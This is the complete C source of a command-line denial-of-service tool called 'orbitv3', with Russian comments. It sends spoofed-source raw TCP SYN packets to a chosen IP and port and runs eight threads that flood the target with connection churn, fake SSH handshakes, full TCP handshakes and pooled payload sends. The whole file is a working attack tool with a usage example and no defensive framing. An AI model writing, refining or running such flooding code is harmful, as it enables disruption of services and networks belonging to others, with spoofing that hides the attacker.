#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <errno.h>
#include <time.h>
#include <stdint.h>
#include <pthread.h>
#include <sys/epoll.h>
#include <fcntl.h>
#include <signal.h>

// tcp options
#define PROTO_TCP_OPT_NOP   1
#define PROTO_TCP_OPT_MSS   2
#define PROTO_TCP_OPT_WSS   3
#define PROTO_TCP_OPT_SACK  4
#define PROTO_TCP_OPT_TSVAL 8

// random number generator
static uint32_t x, y, z, w;

// thread data
struct thread_data {
    uint32_t target_ip;
    uint16_t port;
    int duration;
    int thread_id;
};

// global variables for attack control
static volatile int attack_running = 1;

void rand_init(void) {
    x = time(NULL);
    y = getpid() ^ getppid();
    z = clock();
    w = z ^ y;
}

uint32_t rand_next(void) {
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y; y = z; z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}

// checksum functions
uint16_t checksum_generic(uint16_t *addr, uint32_t count) {
    register unsigned long sum = 0;
    for (sum = 0; count > 1; count -= 2)
        sum += *addr++;
    if (count == 1)
        sum += (char)*addr;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len) {
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    
    while (len > 1) {
        sum += *buf;
        buf++;
        len -= 2;
    }
    if (len == 1)
        sum += *((uint8_t *) buf);
    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;
    while (sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);
    return ((uint16_t) (~sum));
}

// socket flood - создает множество подключений
void* socket_flood_thread(void *arg) {
    struct thread_data *data = (struct thread_data*)arg;
    struct sockaddr_in target;
    int *sockets = malloc(1000 * sizeof(int));
    int socket_count = 0;
    
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = data->target_ip;
    target.sin_port = htons(data->port);
    
    printf("thread %d: starting socket flood\n", data->thread_id);
    
    while (attack_running) {
        // создаем новые сокеты
        for (int i = 0; i < 50 && socket_count < 1000; i++) {
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock >= 0) {
                fcntl(sock, F_SETFL, O_NONBLOCK);
                connect(sock, (struct sockaddr*)&target, sizeof(target));
                sockets[socket_count++] = sock;
            }
        }
        
        // закрываем старые сокеты
        for (int i = 0; i < socket_count; i++) {
            if (sockets[i] > 0) {
                close(sockets[i]);
                sockets[i] = -1;
            }
        }
        
        usleep(1000); // 1ms delay
    }
    
    // cleanup
    for (int i = 0; i < socket_count; i++) {
        if (sockets[i] > 0) close(sockets[i]);
    }
    free(sockets);
    
    printf("thread %d: socket flood finished\n", data->thread_id);
    return NULL;
}

// ssh drop - имитирует ssh подключения для нагрузки CPU
void* ssh_drop_thread(void *arg) {
    struct thread_data *data = (struct thread_data*)arg;
    struct sockaddr_in target;
    int sock;
    char ssh_payload[] = "SSH-2.0-OpenSSH_8.0\r\n";
    char ssh_auth[] = "SSH-2.0-OpenSSH_8.0\r\n";
    char ssh_key[] = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vbqajDhA...";
    
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = data->target_ip;
    target.sin_port = htons(data->port);
    
    printf("thread %d: starting ssh drop\n", data->thread_id);
    
    while (attack_running) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock >= 0) {
            fcntl(sock, F_SETFL, O_NONBLOCK);
            
            // пытаемся подключиться
            if (connect(sock, (struct sockaddr*)&target, sizeof(target)) == 0 || errno == EINPROGRESS) {
                // отправляем ssh данные
                send(sock, ssh_payload, strlen(ssh_payload), MSG_NOSIGNAL);
                usleep(1000);
                send(sock, ssh_auth, strlen(ssh_auth), MSG_NOSIGNAL);
                usleep(1000);
                send(sock, ssh_key, strlen(ssh_key), MSG_NOSIGNAL);
                
                // держим соединение немного
                usleep(5000);
            }
            close(sock);
        }
        
        usleep(100); // 100us delay для максимальной нагрузки
    }
    
    printf("thread %d: ssh drop finished\n", data->thread_id);
    return NULL;
}

// tcp handshake flood - полные tcp handshake
void* tcp_handshake_thread(void *arg) {
    struct thread_data *data = (struct thread_data*)arg;
    struct sockaddr_in target;
    int sock;
    
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = data->target_ip;
    target.sin_port = htons(data->port);
    
    printf("thread %d: starting tcp handshake flood\n", data->thread_id);
    
    while (attack_running) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock >= 0) {
            fcntl(sock, F_SETFL, O_NONBLOCK);
            
            // полный tcp handshake
            if (connect(sock, (struct sockaddr*)&target, sizeof(target)) == 0 || errno == EINPROGRESS) {
                // отправляем данные
                char data_payload[1024];
                memset(data_payload, rand_next() & 0xFF, sizeof(data_payload));
                send(sock, data_payload, sizeof(data_payload), MSG_NOSIGNAL);
                
                // держим соединение
                usleep(10000);
            }
            close(sock);
        }
        
        usleep(500); // 500us delay
    }
    
    printf("thread %d: tcp handshake finished\n", data->thread_id);
    return NULL;
}

// connection pool flood - пул соединений
void* connection_pool_thread(void *arg) {
    struct thread_data *data = (struct thread_data*)arg;
    struct sockaddr_in target;
    int *sockets = malloc(500 * sizeof(int));
    int socket_count = 0;
    int max_sockets = 500;
    
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = data->target_ip;
    target.sin_port = htons(data->port);
    
    printf("thread %d: starting connection pool flood\n", data->thread_id);
    
    while (attack_running) {
        // создаем новые соединения
        for (int i = 0; i < 20 && socket_count < max_sockets; i++) {
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock >= 0) {
                fcntl(sock, F_SETFL, O_NONBLOCK);
                if (connect(sock, (struct sockaddr*)&target, sizeof(target)) == 0 || errno == EINPROGRESS) {
                    sockets[socket_count++] = sock;
                } else {
                    close(sock);
                }
            }
        }
        
        // отправляем данные по всем соединениям
        for (int i = 0; i < socket_count; i++) {
            if (sockets[i] > 0) {
                char payload[512];
                memset(payload, rand_next() & 0xFF, sizeof(payload));
                send(sockets[i], payload, sizeof(payload), MSG_NOSIGNAL);
            }
        }
        
        // закрываем часть соединений
        for (int i = 0; i < socket_count / 4; i++) {
            if (sockets[i] > 0) {
                close(sockets[i]);
                sockets[i] = -1;
            }
        }
        
        usleep(2000); // 2ms delay
    }
    
    // cleanup
    for (int i = 0; i < socket_count; i++) {
        if (sockets[i] > 0) close(sockets[i]);
    }
    free(sockets);
    
    printf("thread %d: connection pool finished\n", data->thread_id);
    return NULL;
}

void attack_tcp_bypass(uint32_t target_ip, uint16_t dport, int duration) {
    int fd;
    char *pkt = malloc(128);
    struct iphdr *iph = (struct iphdr *)pkt;
    struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
    uint8_t *opts = (uint8_t *)(tcph + 1);
    struct sockaddr_in sin;
    
    // create raw socket
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
        perror("socket");
        return;
    }
    
    int one = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(int)) == -1) {
        perror("setsockopt");
        close(fd);
        return;
    }
    
    // setup target address
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = target_ip;
    sin.sin_port = htons(dport);
    
    // setup ip header
    iph->version = 4;
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + 20);
    iph->id = htons(0xffff);
    iph->ttl = 64;
    iph->frag_off = htons(1 << 14); // df bit
    iph->protocol = IPPROTO_TCP;
    iph->saddr = 0; // will be randomized
    iph->daddr = target_ip;
    
    // setup tcp header
    tcph->source = htons(0xffff); // will be randomized
    tcph->dest = htons(dport);
    tcph->seq = htons(0xffff); // will be randomized
    tcph->ack_seq = 0;
    tcph->doff = 10; // 40 bytes total header
    tcph->urg = 0;
    tcph->ack = 0;
    tcph->psh = 0;
    tcph->rst = 0;
    tcph->syn = 1; // syn flag
    tcph->fin = 0;
    tcph->window = htons(65535);
    tcph->urg_ptr = 0;
    
    // tcp options
    *opts++ = PROTO_TCP_OPT_MSS;
    *opts++ = 4;
    *((uint16_t *)opts) = htons(1400 + (rand_next() & 0x0f));
    opts += sizeof(uint16_t);
    *opts++ = PROTO_TCP_OPT_SACK;
    *opts++ = 2;
    *opts++ = PROTO_TCP_OPT_TSVAL;
    *opts++ = 10;
    *((uint32_t *)opts) = rand_next();
    opts += sizeof(uint32_t);
    *((uint32_t *)opts) = 0;
    opts += sizeof(uint32_t);
    *opts++ = 1; // nop
    *opts++ = PROTO_TCP_OPT_WSS;
    *opts++ = 3;
    *opts++ = 6;
    
    printf("starting tcp bypass attack on %s:%d for %d seconds\n", 
           inet_ntoa(*(struct in_addr*)&target_ip), dport, duration);
    
    // создаем дополнительные потоки для socket flood и ssh drop
    pthread_t threads[8];
    struct thread_data thread_data[8];
    
    // инициализируем данные для потоков
    for (int i = 0; i < 8; i++) {
        thread_data[i].target_ip = target_ip;
        thread_data[i].port = dport;
        thread_data[i].duration = duration;
        thread_data[i].thread_id = i;
    }
    
    // запускаем дополнительные потоки
    pthread_create(&threads[0], NULL, socket_flood_thread, &thread_data[0]);
    pthread_create(&threads[1], NULL, ssh_drop_thread, &thread_data[1]);
    pthread_create(&threads[2], NULL, tcp_handshake_thread, &thread_data[2]);
    pthread_create(&threads[3], NULL, connection_pool_thread, &thread_data[3]);
    pthread_create(&threads[4], NULL, socket_flood_thread, &thread_data[4]);
    pthread_create(&threads[5], NULL, ssh_drop_thread, &thread_data[5]);
    pthread_create(&threads[6], NULL, tcp_handshake_thread, &thread_data[6]);
    pthread_create(&threads[7], NULL, connection_pool_thread, &thread_data[7]);
    
    time_t start_time = time(NULL);
    while (time(NULL) - start_time < duration) {
        // randomize source ip
        iph->saddr = rand_next();
        
        // randomize ip id
        iph->id = rand_next() & 0xffff;
        
        // randomize source port
        tcph->source = rand_next() & 0xffff;
        
        // randomize seq number
        tcph->seq = rand_next();
        
        // randomize ack number
        tcph->ack_seq = rand_next();
        
        // recalculate checksums
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
        tcph->check = 0;
        tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + 20), sizeof(struct tcphdr) + 20);
        
        // send packet
        sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + 20, MSG_NOSIGNAL, 
               (struct sockaddr *)&sin, sizeof(sin));
    }
    
    // останавливаем дополнительные потоки
    attack_running = 0;
    
    // ждем завершения потоков
    for (int i = 0; i < 8; i++) {
        pthread_join(threads[i], NULL);
    }
    
    close(fd);
    free(pkt);
    printf("attack finished\n");
}

void usage(void) {
    printf("usage: orbitv3 -i <target_ip> -p <target_port> -d <seconds>\n");
    printf("example: orbitv3 -i 192.168.1.1 -p 80 -d 60\n");
}

int main(int argc, char *argv[]) {
    uint32_t target_ip = 0;
    uint16_t port = 0;
    int duration = 0;
    int opt;
    
    if (argc != 7) {
        usage();
        return 1;
    }
    
    while ((opt = getopt(argc, argv, "i:p:d:")) != -1) {
        switch (opt) {
            case 'i':
                target_ip = inet_addr(optarg);
                if (target_ip == INADDR_NONE) {
                    printf("invalid ip address: %s\n", optarg);
                    return 1;
                }
                break;
            case 'p':
                port = atoi(optarg);
                if (port == 0) {
                    printf("invalid port: %s\n", optarg);
                    return 1;
                }
                break;
            case 'd':
                duration = atoi(optarg);
                if (duration <= 0) {
                    printf("invalid duration: %s\n", optarg);
                    return 1;
                }
                break;
            default:
                usage();
                return 1;
        }
    }
    
    if (target_ip == 0 || port == 0 || duration == 0) {
        usage();
        return 1;
    }
    
    // check if running as root
    if (getuid() != 0) {
        printf("error: must run as root for raw sockets\n");
        return 1;
    }
    
    rand_init();
    attack_tcp_bypass(target_ip, port, duration);
    
    return 0;
}
